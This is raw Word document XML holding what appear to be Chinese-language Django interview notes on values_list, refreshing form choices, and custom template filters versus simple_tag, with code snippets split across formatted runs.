          <w:numId w:val="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values_list : queryset类型的列表中是元组</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1177EDA5" w14:textId="26D27C03" w:rsidR="00191162" w:rsidRDefault="00B37327"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Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>010</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00191162">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>django的Form组件中，如果字段中包含choices参数，使用两种方式实现数据源实时更新</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D463203"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AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"># 1. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>重写构造函数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22E1B654"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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>def__init__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0055AA"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>self</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args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kwargs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0724320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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="3300AA"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>super</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>().</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>__init__</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>args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kwargs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C54DDB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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="0055AA"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>self</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>fields</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>"city"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>].</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>widget</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>choices</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>City</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>objects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>().</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>values_list</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>"id"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>"name"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC11FB0"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AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"># 2. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ModelChoiceField</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字段，参数为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA5500"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E489F0" w14:textId="1ECB63D2"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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>authors</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>form_model</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ModelMultipleChoiceField</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>queryset</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>NNewType</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>objects</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>all</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>())</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="981A1A"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>//</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>多选</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F62A365" w14:textId="710C7F1C"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012</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模板中自定义</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>simple_tag</w:t>
      </w:r>
      <w:r w:rsidR="00191162" w:rsidRPr="000F657C">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="162342AB" w14:textId="77777777" w:rsidR="00191162" w:rsidRDefault="00191162" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="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自定义filter：{{ 参数1|filter函数名:参数2 }} 1.可以与if标签来连用 2.自定义时需要写两个形参</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32189753"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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>例子：自定义</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57027879"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1.</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app01</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>下创建一个叫</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>templatetags</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Python</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>包</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E139E4B"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2.</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templatetags</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的文件夹下创建</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>myfilters</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="217B4457"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lastRenderedPageBreak/>
        <w:t>           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="116644"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>3.</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py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件中写代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC480AE"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from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="770088"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>import</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>template</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180C9EB1"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000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>register</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>template</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Library</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FCA62D3"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p>
    <w:p w14:paraId="5582D8F9"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555555"/>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filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C0613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add_sb</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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="AA1111"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>'aaa'</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
